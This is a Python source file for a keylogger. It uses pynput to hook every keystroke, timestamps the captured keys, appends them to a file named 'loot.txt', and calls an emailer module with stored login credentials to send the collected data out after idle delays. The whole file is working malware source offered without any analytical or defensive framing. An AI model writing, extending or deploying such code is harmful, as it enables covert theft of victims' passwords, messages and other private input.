import pynput.keyboard
import datetime
import ticker
import emailer

class KeyboardListener:
    def __init__(self, login="", password="", key_delay=500, email_delay=1000):
        self.KEY_DELAY_MAX = key_delay
        self.EMAIL_DELAY_MAX = email_delay
        self.captured_keys = []
        self.key_delay_counter = ticker.Ticker()
        self.email_delay_counter = ticker.Ticker()
        self.sender = emailer.Emailer(login, password)
        self.sender.start()

    def on_press(self, key):
        if self.key_delay_counter.is_started() and self.email_delay_counter.is_started():
            elapsed_key_delay = self.key_delay_counter.stop()
            elapsed_email_delay = self.email_delay_counter.stop()
        else:
            elapsed_key_delay = -1
            elapsed_email_delay = -1

        key_char = str(key).replace('\'', '').replace('Key.', '')

        if len(key_char) > 1:
            key_char = "<%s>" % key_char.upper()

        now = datetime.datetime.now().strftime("%d.%m.%Y | %H:%M:%S>")
        key_data = (key_char, elapsed_key_delay, elapsed_email_delay, now)

        self.captured_keys.append(key_data)

    def on_release(self, key):
        self.key_delay_counter.start()
        self.email_delay_counter.start()

        self.log_captured_keys("loot.txt")
        self.captured_keys = []

    def log_captured_keys(self, logfile):
        write_data = ''

        with open(logfile, "a") as f:
            for key in self.captured_keys:
                char, key_delay, email_delay, now = key

                if key_delay > self.KEY_DELAY_MAX:
                    write_data += "\n" + now + ' ' + char
                else:
                    write_data += char

                if email_delay > self.EMAIL_DELAY_MAX:
                    print("SEND!")
                    self.sender.send()
                    self.email_delay_counter.start()

            f.write(write_data)

    def start(self):
        with pynput.keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()
